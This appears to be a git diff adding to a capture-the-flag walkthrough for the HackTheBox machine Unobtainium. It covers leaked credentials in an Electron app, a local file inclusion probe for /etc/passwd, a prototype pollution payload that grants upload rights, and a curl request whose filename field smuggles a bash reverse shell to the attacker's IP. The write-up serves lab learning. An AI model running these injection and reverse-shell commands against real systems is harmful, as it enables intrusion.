@@ -171,7 +171,166 @@ Since this is ane electron app we will look for the .asar file which contains so
 ```
 find . -name *.asar
 ```
-/opt/unobtainium/resources/app.asar  
+/opt/unobtainium/resources/app.asar   
+We will extract it to /home/kali/app  
+
+![obraz](https://github.com/user-attachments/assets/fd5d7ea7-aed8-4f6a-8d90-7ed1d4e86fd0)  
+
+
+
+## Source code - Analysis  
+
+![obraz](https://github.com/user-attachments/assets/2cef7813-d18e-46d8-b4d8-c2cdf939910e)
+
+After some enumeration we found todo.js  
+
+![obraz](https://github.com/user-attachments/assets/4ff44091-3a4e-45a3-a2ae-01f76ec92b57)
+
+It contained a post request with credentials in it:  
+Felamos:Winter2021
+
+We can of course try those credentials for ssh but without a success unfortunately.  
+Back to the request, it's a post request to http://unobtainium.htb:31337/todo with some json data.  
+
+We know that port 31337 is open from previous nmap scan.  
+It should be possible to replicate this request.  
+```
+curl -s http://unobtainium.htb:31337/todo -H "Content-Type: application/json" -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}' | jq
+```
+![obraz](https://github.com/user-attachments/assets/1f556558-5876-4ed1-adcd-9b661740a7e9)
+
+Whenever I encounter a parameter like 'filename', I test it for Local File Inclusion.  
+```
+curl -s http://unobtainium.htb:31337/todo -H "Content-Type: application/json" -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "/etc/passwd"}' | jq
+```
+
+It just hangs for any LFI outside local folder.  
+We can try to use LFI to get server-side .js file:
+
+![obraz](https://github.com/user-attachments/assets/248148e3-2b88-40f5-800a-4808f93d9f1a)
+
+index.js was a guess, it could be named differently.   
+Let's analyze it a bit.  
+Admin password is random:  
+```
+const users = [
+  {name: 'felamos', password: 'Winter2021'},
+  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
+];
+...[snip]...                              
+function findUser(auth) {
+  return users.find((u) =>
+    u.name === auth.name &&
+    u.password === auth.password);
+}
+```
+admin can also upload and delete which felamos can't do.  
+
+If we sift through the code we can eventually find JS merge function which is a dangerous function.  
+There is also /upload portion of code that checks if user has canUpload set to yes.  
+```
+app.post('/upload', (req, res) => {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+
+  filename = req.body.filename;
+  root.upload("./",filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+});
+```
+
+We can't access /upload yet.  
+
+
+## Prototype Pollution (JS merge function)  
+
+"Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.  
+JavaScript allows all Object attributes to be altered, including their magical attributes such as __proto__"
+
+
+
+This part of the code is vulnerable:  
+```
+app.put('/', (req, res) => {   
+  const user = findUser(req.body.auth || {});
+
+  if (!user) {                                 
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  const message = {
+    icon: '__',
+  };
+
+  _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+  });
+
+  messages.push(message);
+  res.send({ok: true});
+});
+```
+
+it has this json data (taken from app.js):  
+```
+{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}
+```
+
+We can modify it a little:  
+```
+{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"__proto__":{"canDelete":true,"canUpload":true}}}
+```
+
+And now we can send it:  
+
+![obraz](https://github.com/user-attachments/assets/9de8080a-85f5-4092-b723-ae94d91877b0)
+
+
+## Exploiting Command Injection
+
+Now we have an ability to upload files, but it can also be used to inject commands:  
+
+![obraz](https://github.com/user-attachments/assets/7015adb6-5077-43b5-9148-a0ec35939514)
+
+We got a ping back:  
+
+![obraz](https://github.com/user-attachments/assets/17d2a02a-8d6e-40be-a013-58c14b98fe1f)
+
+Now all we have to do is inject reverse shell one liner to get shell access:  
+```
+curl -X POST http://10.10.10.235:31337/upload -H 'content-type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "; bash -c \"bash >& /dev/tcp/10.10.14.7/9005 0>&1\""}'
+```
+
+![obraz](https://github.com/user-attachments/assets/08acf60d-abd4-4816-ba55-f7d246a1cebe)
+
+![obraz](https://github.com/user-attachments/assets/06ecac76-7e33-40f6-b403-23fa5027b8cc)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
